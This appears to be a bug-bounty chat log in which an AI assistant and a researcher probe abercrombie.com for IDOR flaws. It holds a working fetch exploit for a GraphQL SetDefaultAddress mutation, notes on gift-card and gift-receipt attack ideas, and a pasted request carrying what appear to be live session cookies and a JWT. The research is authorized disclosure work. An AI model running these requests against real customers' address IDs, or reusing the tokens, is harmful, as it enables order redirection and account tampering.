I've taken this as far as it goes without a live confirming request. Here's where it stands.

What's built and ready
Seven candidates, all documented with exact request shapes in idor-candidates-bff.md, plus C1 fully execute-ready in C1-address-idor-EXECUTE.md:

C1 — Address IDOR ← strongest. Object IDs are confirmed sequential integers (21388951835 from your own captured traffic), and three mutations (SetDefaultAddress/UpdateAddress/RemoveAddress) take a bare ID!. Repointing a victim's default shipping address = order/PII redirect, High→Critical.
C5 — Gift-card apply without PIN (money vector, PIN/captcha optional at API layer)
C2 — GenerateGiftReceipt exfil to attacker email
C3 — Order details possibly postalCode-gated not session-gated
C6/C7 — SendToRegister URL sink / SubmitOrder price integrity
Confirmed dead ends (good signal, not wasted): introspection is disabled (INTROSPECTION_DISABLED), the OTP change-email race is properly bound, guest lookup is two-factor, the vendor portal is hardened.

The blunt truth about "find one, I'm not doing anything"
I can't hand you a confirmed bug from zero action, and I won't fake one. Every remaining candidate confirms with one request — but that request must come from an account context I don't have. The only way to confirm C1 with literally zero action from you is to fire it at a neighboring real customer's address ID (21388951834, …). That's unauthorized access to a real person's data — the program's explicit hard-stop, and a line I won't cross regardless of framing. That's not caution; it's the difference between research and a crime.

I physically cannot: log in (no password), create account B, or click through your browser session.

The single unlock — ~5 minutes of yours, then I drive
Register one second +alias@wearehackerone.com account on abercrombie.com. Then either:

you paste the two session cookies (A and B) here and I'll run the C1 sequence end-to-end and confirm it, or
you run the four copy-paste requests in the EXECUTE file yourself and paste the responses — I'll interpret and write the report.
Do that and C1 is very likely your confirmed bug within the hour. Which route do you want?


----------------------------------------


I did this:
Here's the whole thing, plain and simple. You need two accounts you own and about 10 minutes.

Setup (one-time)
You already have account A = saad101...@wearehackerone.com.
Register account B = a different alias, e.g. saad101+bvictim@wearehackerone.com, on abercrombie.com. Verify it, log in once.
Do it in the browser (no Burp needed)
Use two separate browsers (or one normal + one incognito) so A and B stay logged in at the same time.

In browser B (the victim):

Log in as B. Go to your account → Addresses → add an address (any US address). Save it.
Open DevTools (F12) → Network tab → reload the Addresses page.
Click the request to /api/bff/customer that returns your addresses. In the response, find your address id — it'll be an 11-digit number like 21388951835. Copy that number. Call it idB.
In browser A (the attacker):
4. Log in as A. Open the account → Addresses page (so you have a valid session).
5. DevTools → Network → do any address action so you can see a real /api/bff/customer request. Right-click it → Copy → Copy as fetch (or "Copy as cURL").
6. Paste that into the DevTools Console, then edit it: change the body to the SetDefaultAddress call using idB (B's id, which A should NOT be able to touch):


fetch("https://www.abercrombie.com/api/bff/customer?brand=anf&catalogId=10901&country=US&langId=-1&store=a-wd&storeId=11203", {
  method:"POST",
  headers:{"Content-Type":"application/json","x-operation-name":"SetDefaultAddress"},
  credentials:"include",
  body: JSON.stringify({operationName:"SetDefaultAddress",variables:{id:"idB_GOES_HERE"},query:"mutation SetDefaultAddress($id: ID!){setDefaultAddress(id:$id){success __typename}}"})
}).then(r=>r.json()).then(console.log)
Run it. Look at the result.
Read the result
{success:true} or it returns B's data → CONFIRMED IDOR. Account A just modified account B's address. That's the bug.
Error / NOT_FOUND / authz error → not vulnerable (server checks ownership). Move to C5.
Prove it: back in browser B, reload Addresses — if the default/data changed, screenshot both browsers side by side (both account emails visible). Then revert.

What to send me
Paste back:

the result JSON from step 7, and
whether B's address actually changed.
That's it — I'll tell you instantly if it's confirmed and, if so, write the HackerOne report. All four variants (read / repoint / overwrite / delete) are in C1-address-idor-EXECUTE.md if the first one errors and you want to try the others.

One faster option: if you paste A's and B's session cookies here, I'll run the whole sequence and confirm it myself. Your call — the DevTools route keeps your cookies in your own browser.





okay this C1 IDOR is actually working:


Below was a request captured in burp for making a adress default address.
In Below Request i changed the id and entered another address_id which was in another account and it made the address a default address also in another account

Below Request:

POST /api/bff/customer?storeId=11203&catalogId=10901&langId=-1&country=PK&brand=anf&store=a-wd HTTP/2
Host: www.abercrombie.com
Cookie: ANF_TARGET=8e046d4d-581b-4083-84a1-a20f22299dbf.34_0; s_ecid=MCMID%7C63714318880808094776545011275190625788; utag_main_v_mcid=63714318880808094776545011275190625788; xSeg=b1%3DGO%26b%3DGC%26sq%3Da-1%26s2%3DFL%26g1%3DGK%26p2%3DFT%26g2%3DGS%26c%3DFX%26co%3DFN%26p%3DHA; eventdb_testgroup=a; utag_main_vapi_domain=abercrombie.com; utag_main_v_id=01a0e3fea07c004243455f8038d80506f011d06700980; TAPID=abercrombie-hco/main>01a0e3fea07c004243455f8038d80506f011d06700980|; _gcl_au=1.1.1566288325.1790531515; _fbp=fb.1.1790531516893.83713856650118590; userType=R; af-minicart-11203=0; loyalty_points=0; loyalty_to_next_reward=0; s_fid=6619A1BBD47435DE-2BA4CB5D7301EA7A; ANF_AUTHENTICATION=1790546572089; geoLocation=PK:SD:75520; ANFSession=112031790546572095; rxVisitor=179054657336796COB777APQDMNMOLV5SEMTGRK1E7KQ6; at_check=true; AMCVS_92D21C8B532954A90A490D4D%40AdobeOrg=1; _fs_cd_cp_pRdRgnTnF68pCV2F=AQZQ5naKRq11lqJJLzxogZvkIjYDVf4TvQzzoTXp5LYEO-HMonvD9IdTwvnNQbag8PqUNce-7jdifHF1pW5loCgcdMTorYrxt2rmSzQ2WA6EUJC00pGQwDjEkhfCpn6n-WU8l5VoxxIUILqiuMqjWhtUiMpfkqs0RcY8fGHe5Tjxout1mYAmWU7uD3Eh17XKCHK5pz8hcw==; mboxEdgeCluster=37; uPref={%22sf%22:%22PK%22%2C%22shipTo%22:%22PK%22%2C%22cur%22:%22USD%22%2C%22brnd%22:%22anf%22}; utag_main__sn=2; utag_main_ses_id=1790546594645%3Bexp-session; s_cc=true; utag_main__ss=0%3Bexp-session; utag_main_dle_occurred=true%3Bexp-session; utag_main_dc_visit=2; OptanonAlertBoxClosed=2026-09-27T22:03:24.153Z; dtCookie=v_4_srv_17_sn_913E99C3978310E2B09720F07554CC52_app-3A59fcf8f3ef580f1f_1_app-3Aea7c4b59f27d43eb_1_ol_0_perc_100000_mul_1; BTanalytics=%7B%22WCSAcctCreate%22%3A%22true%22%7D; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=Ujp5Dw68XmHCewOSymQ4Jao5xsvK2kf4xHyDV8gNEx0%3D%3B2026-09-27+18%3A08%3A16.016_1790546896005-14535_11203; WC_AUTHENTICATION_21796683622=21796683622%2CSxIBElVqZKL8ShaOttqhSxO8enOX7xI6R1bIIjgkaVM%3D; WC_ACTIVEPOINTER=-1%2C11203; mbox=PC#42dfdcd45bd64efab2f6a7e26f9b8071.37_0#1853791701|session#3938f94d9f8f45c9bc590ab8eb350557#1790548761; ANF_AUTH=eyJhbGciOiJIUzUxMiJ9.eyJzZXNzaW9uIjoiMjAyNi0wOS0yNyAxODowODoxNi4wMTYiLCJpZCI6IjExMjAzOjIxNzk2NjgzNjIyOjA6MCIsInV1aWQiOiJtRldBSUxCQ3BXRzMyTkdielVsSXRCU2xYOEJCY0lJUGtQb2RVK1FJM3haUzI2ZXRmRTQ4ekcrVXc1VHFoekFsIiwiaWF0IjoxNzkwNTQ2OTAxLCJleHAiOjE3OTA1NDg3MDF9.E0b1TxUwlxZZBDjPFjREOiS831EDq8kRYf7-Sam6BrTGWjH5TxaDG-nfZNUY2ENaKDB7ueQd4fC0nYm7n97dwg; at_check=true; AMCV_92D21C8B532954A90A490D4D%40AdobeOrg=1585540135%7CMCIDTS%7C20724%7CMCMID%7C63714318880808094776545011275190625788%7CMCAAMLH-1791151721%7C6%7CMCAAMB-1791151721%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1790554121s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-20731%7CvVersion%7C4.4.0; mboxEdgeCluster=37; mbox=PC#42dfdcd45bd64efab2f6a7e26f9b8071.37_0#1853791723|session#3a0933ea3fc445e38650cbb71dfeec82#1790548783; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Sep+28+2026+03%3A08%3A44+GMT%2B0500+(Pakistan+Standard+Time)&version=202511.1.0&browserGpcFlag=0&isIABGlobal=false&identifierType=Cookie+Unique+Id&hosts=&consentId=21796683622&interactionCount=2&isAnonUser=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&iType=&intType=1&geolocation=PK%3BSD&AwaitingReconsent=false; utag_main__pn=4%3Bexp-session; adobe_page_type=my account; adobe_page_name_persist=anf:anf:my account::::::; fs_lua=1.1790546929231; fs_uid=#o-234GET-na1#cb165297-58f3-4533-8c2c-4fae8da5b9cf:335bd5cc-98d2-4bcb-a401-718cfddb01f2:1790546596488::4#58e421ea###/1822067537; utag_main_dc_event=7%3Bexp-session; WC_USERACTIVITY_21796683622=21796683622%2C11203%2Cnull%2Cnull%2C1790546896017%2C1790550607451%2Cnull%2Cnull%2Cnull%2Cnull%2C1383256606%2Cver_1790546896017%2C5VeztOc%2FgsFmIdWZffOSa7aP2SSVLU47ZHGCp4Dpyd1GYvAune6BfOboOSZ5djjLcWZToULKCQEcDetHiB4KudrrZ8utgtihOawzuzuna2%2FtMta6C10jvKUaGuH60Vk8zw16fEa%2B6N13FxTZw%2BbnRF9FdG3DbiASW8ub0xJVaLtdgKiSz9qfLe8OKSZcf8RUPtSCZh1cevGo8V%2BrPqMo59OntW5%2Fl7H3FIA5h4M%2B2qJGUdN7WoD5vfAZZaiGHll%2Ft8mnWvFhS4xP1zapIAsUxE%2BusLwgN2kgbJbUF6HBh3ZBSBNsBn3hHHATSxHuaark; rxvt=1790548807390|1790546573375; utag_main__se=23%3Bexp-session; utag_main__st=1790548807397%3Bexp-session; utag_main__prevpage=anf:anf:my account::::::%3Bexp-1790550607404; dtPC=17$146917334_901h-vDPDHFUFRAILWFKEPMHGHNMRBWMPAIBHK-0e0; s_sq=afabercrombieglobal%3D%2526c.%2526a.%2526activitymap.%2526page%253Danf%25253Aanf%25253Amy%252520account%25253A%25253A%25253A%25253A%25253A%25253A%2526link%253DMake%252520Default%2526region%253Dcustomer-web-service-account%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Danf%25253Aanf%25253Amy%252520account%25253A%25253A%25253A%25253A%25253A%25253A%2526pidt%253D1%2526oid%253DfunctioneZ%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DBUTTON%26afabercrombieglobaldev%3D%2526c.%2526a.%2526activitymap.%2526page%253Danf%25253Aanf%25253Ahomepage%25253A%25253A%25253A%25253A%25253A%25253A%2526link%253DSign%252520In%252520or%252520Create%252520Account%2526region%253Dcustomer-web-service-DesktopSignInFrontend%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Danf%25253Aanf%25253Ahomepage%25253A%25253A%25253A%25253A%25253A%25253A%2526pidt%253D1%2526oid%253Dfunctionkd%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DBUTTON
Content-Length: 192
Sec-Ch-Ua-Platform: "Windows"
X-Operation-Name: SetDefaultAddress
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Traceparent: 00-b536a3c391ebc6f7c408756441c368c5-7243ee136e1b9cfc-01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json
Tracestate: e094cc82-e67c5af3@dtr=2;7243ee136e1b9cfc;1;59fcf8f3ef580f1f;179054657336796COB777APQDMNMOLV5SEMTGRK1E7KQ6;DPDHFUFRAILWFKEPMHGHNMRBWMPAIBHK-0;1
Origin: https://www.abercrombie.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.abercrombie.com/shop/account/settings/address?storeId=11203&catalogId=10901&langId=-1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

[{"operationName":"SetDefaultAddress","variables":{"id":"21389180051"},"query":"mutation SetDefaultAddress($id: ID!) {\n  setDefaultAddress(id: $id) {\n    success\n    __typename\n  }\n}\n"}]


When ID Changed also same Response and changed to default address in another account:
HTTP/2 200 OK
Timing-Allow-Origin: *
Set-Cookie: WC_USERACTIVITY_21796683622=21796683622%2C11203%2Cnull%2Cnull%2C1790546896017%2C1790551530481%2Cnull%2Cnull%2Cnull%2Cnull%2C1383256606%2Cver_1790546896017%2CRdysCS6WlZmUQnOn8YH9HPl3MdnhJUvCcy9yaX2gNeomTQ7ZIlGXcwapTzspA1bAzqmvgqFTzd4396zwhHhjOzdjOTZGxYYQUaecoUgQp1ear9gkMk9gbA1WyzZB%2Bq5fVJ6utIskEksOVAscOmYdr4tC%2FQYPGIEmk95eJSmlRZCIIWE%2BgMPR7M%2FvLIZ3c5OJRb2gA90neDeDdNlH69b4KVjmZLvHgzzkCV165M9f%2F1lYMFNNVHuqb0E%2BNLFM0KPEb2cuop40ANfqCArbyYvx6ZXs4VJcll8GOrtb3w%2FbR05U01lmXLqvL7Be9GHrUE0E; Path=/; Secure
Set-Cookie: WC_USERACTIVITY_21796683622=21796683622%2C11203%2Cnull%2Cnull%2C1790546896017%2C1790551530492%2Cnull%2Cnull%2Cnull%2Cnull%2C1383256606%2Cver_1790546896017%2CEIQEDirfaStLmKqx4NSZXxtM%2BfHfJMRIRP3R2sKXLtQj40dAIEP%2BxZ91Y7SbR9tl3nXMVfzBppyzoosyooBV1rMXCoCr%2FBp4I11JghUWlnps54OkkXzy%2BGzdZr52OCiazCCvN8k2MCgWoUZdDWq4FZW7%2BnAMz27U5NriYJRGDSwBCYH%2BSAhA%2BnZUXh8FuwvGKYLTsgsiC3qU1b0hrxKFcXkqu%2Fn4Wxanmrz7Odr8RFyeCraQaUe06I6Dwv%2Fi6kV9iHaxbXH7twX4kjIONsXafwh%2B2b%2FGFNOe%2FN1SEBeenEilP6PODhG3Txpn7l1iuyBl; Path=/; Secure
Content-Type: application/json; charset=utf-8
Server-Timing: dtTrId;desc="b536a3c391ebc6f7c408756441c368c5", dtSInfo;desc="1"
Bff-Api-Response: address-set-default-200
Etag: W/"50-o91vNYGPcaQh9UWGahpKmdJ60I8:dtagent1034526081017033023X5"
X-Powered-By: Express
Edge-Cache-Tag: www-wd,www-wd-anf,anf,/api/bff/customer,customer,
Accept-Ranges: bytes
Edge-Control: max-age=0
Cache-Control: max-age=0, no-store
Date: Sun, 27 Sep 2026 22:25:30 GMT
X-Cache: MISS, MISS, MISS
X-Cache-Hits: 0, 0, 0
Vary: Accept-Encoding, User-Agent, User-Agent
Strict-Transport-Security: max-age=31536000
Access-Control-Allow-Methods: HEAD, GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Requested-With
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Access-Control-Allow-Origin: https://www.abercrombie.com
X-Digest-Hash: A2F1DD8AEFD025A42DC5AE51E0376DB874439CF459B044C5510A58E618DA705C
Edgescape-To-Origin: georegion=-,country_code=PK,region_code=SD,city=karachi,dma=-1,pmsa=-,areacode=0,county=-,fips=-,lat=24.860,long=66.990,timezone=500,zip=75520,continent=AS,throughput=broadband,asnum=9541
X-Cache-Key: (null)&ABERFITCH_CONTAINER=/8785/
Content-Length: 80

[{"data":{"setDefaultAddress":{"success":true,"__typename":"ItemIDResponse"}}}
]
